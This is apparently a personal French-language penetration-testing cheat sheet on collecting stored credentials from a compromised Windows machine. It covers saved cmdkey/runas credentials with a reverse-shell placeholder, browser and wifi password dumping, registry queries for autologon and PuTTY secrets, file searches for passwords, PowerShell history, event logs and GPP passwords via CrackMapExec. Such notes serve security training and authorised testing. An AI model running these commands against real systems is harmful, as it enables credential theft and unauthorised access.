---
public: true
---
## Dossiers intéressants

```shell
dir c:\
dir "%USERPROFILE%"
dir "%USERPROFILE%\Documents"
dir "%USERPROFILE%\Desktop"
```

## Mots de passe enregistrés

### cmdkey

Si la commande `cmdkey /list` affiche des comptes, on pourra :

- Se connecter avec `mstsc.exe` avec un mot de passe pré enregistré
- Executer une fenêtre DOS en tant que :

```shell
runas /savecred /user:inlanefreight\bob "COMMAND HERE | REVERSE SHELL etc"
```

### Google Chrome

[SharpChrome](https://github.com/GhostPack/SharpDPAPI) peut extraire les identifiants mot de passe stockés.

```shell
.\SharpChrome.exe logins /unprotect
```

## Lazagne

<https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe>

```
lazagne.exe all
```

### SessionGopher

 [SessionGopher](https://github.com/Arvanaghi/SessionGopher)

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target SRV1 # si privilèges suffisants. Sinon, on peut chercher des infos pour son propre compte utilisateur ou tout ceux du poste (si admin)
```

### Autologon

```shell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "AutoAdmin Username Password"
```

### Putty

```shell
# Liste des sessions enregistrées
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
# Interrogation d'une session
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\Server1 | findstr /i "User Pass"
```

### Mots de passe Wifi

```shell
# Liste des profiles
netsh wlan show profile

# Affichage de la clé wifi du profile "Profile1"
netsh wlan show profile Profile1 key=clear
```

## Fichiers Intéressants

## Recherche de fichier automatisée : Snaffler

<https://github.com/SnaffCon/Snaffler/releases/download/1.0.132/Snaffler.exe>

### Recherche de fichiers manuelle

#### CMD

```shell
# FINDSTR
# /S : recherche dans les sous dossiers
# /P : ignore les fichiers ne contenant pas de caractères affichables
# /I : insenssible à la casse
# /N : affiche le numéro des lignes correspondant
# /M : affiche seulement le nom du fichier (pas la ligne correspondant au texte cherché)

# recherche du terme "password" ou "cred" : liste le nom des fichiers contenant "password" (sans afficher le contenu trouvé)
findstr /SIM "password cred" *.xml *.yml *.ini *.txt *.config *.cfg *.git *.ps1 *.vbs *.cmd *.bat 

# recherche du terme "password" ou "cred" : liste le nom des fichiers et la ligne qui a matché
findstr /SPIN  "password cred" *.xml *.yml *.ini *.txt *.config *.cfg *.git *.ps1 *.cmd *.bat  # *.vbs

# Recherche de différents fichiers en même temps
dir /S /B *secret* == *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *.rdp == *.vnc == *.cred == *.kdbx *.vhd* == *.vmdk
```

#### Powershell

```powershell
# Terme intéressants dans des fichiers
Get-ChildItem *.xml, *.yml, *.ini, *.txt, *.config, *.cfg, *.git, *.ps1, *.vbs, *.cmd, *.bat  -Recurse -ErrorAction SilentlyContinue | ? { $_.Path -notlike '*\windows\*' } | Select-String "password"| ft Path, LineNumber, Line -AutoSize

# Fichiers avec des noms intéressants
Get-ChildItem  -Recurse -Include *secret*, *pass*.txt, *pass*.xml, *pass*.ini, *cred*, *vnc*, *.config, *.rdp, *.vnc, *.cred, *.kdbx, *.vhd*, *.vmdk -ErrorAction Ignore | Select -ExpandProperty FullName
```

### Historiques Powershell

On peut vérifier l'emplacement de l'historique via : `(Get-PSReadLineOption).HistorySavePath`

Collecte des historiques (emplacement par défaut)

```powershell
Gci c:\Users -Directory | Select -ExpandProperty Name | %{ gc "C:\Users\$_\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

### Dictionnaire Google Chrome

```powershell
Gci c:\Users -Directory | Select -ExpandProperty Name | %{ gc "C:\Users\$_\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt" -ErrorAction SilentlyContinue | Select-String password }
```

### Pense bête (sticky notes)

```powershell
Gci c:\Users -Directory | Select -ExpandProperty Name | %{ gc "C:\Users\$_\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite" -ErrorAction SilentlyContinue }
 
```

#### Lecture du contenu
- Copier les fichiers  `plum.sqlite*`
- Lire :
	- depuis Windows :
		- graphiquement avec  [DB Browser for SQLite](https://sqlitebrowser.org/dl/) : utiliser la requête `select Text from Note;`
		- via powershell avec le module <https://github.com/RamblingCookieMonster/PSSQLite>
	- depuis Linux :
		- `strings plum.sqlite-wal`
### Autres

```powershell
# Passwords in scripts in different shares :  SYSVOL, IT shares
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
unattend.xml

Passwords in the AD user or computer description fields

KeePass databases --> pull hash, crack and get loads of access.

Found on user systems and shares

Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint

```

### Configuration IIS

Fichier `C:\inetpub\wwwroot\web.config`

### Recherche de unattend.xml

Script a définir (voir emplacements)

## Barre de recherche Windows

Mots à tenter dans la barre de recherche du menu Démarrer

```
Passwords
Passphrases
Keys
Username
User account
Creds
Users
Passkeys
Passphrases
configuration
dbcredential
dbpassword
pwd
Login
Credentials
```

## Observateur d'évènement

Si on est membre du groupe `Event Log Readers`, on pourra consulter l'observateur d'évènements.

Si les Event ID 4688 (Un nouveau processus a été créé) sont audités, on pourra potentiellement trouver lignes de commandes incluant des nom de compte utilisateur (voir des mots de passe).

```shell
###### nécessite d'être membre du gruope "Event Log Readers"
# Affiche toutes les lignes de commande auditées
wevtutil qe Security /rd:true /f:text | Select-String "line"
# Affiche les lignes contenant '/user'
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# avec credentials alternatifs
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

Version Powershell (**Nécessite d'être Administrateur local**)

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

## Email

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

## Mots de passe dans les stratégies de groupe

```
# cme smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password

Local admin:
# cme smb 10.0.5.1 -u Administrator -p P@ss123 -d . -M gpp_password
# cme smb 10.0.5.1 -u Administrator -p P@ss123 --local-auth -M gpp_password

Domain user:
# cme smb 10.0.5.1 -u bkpadmin -p P@ss123 -d target.corp -M gpp_password
```
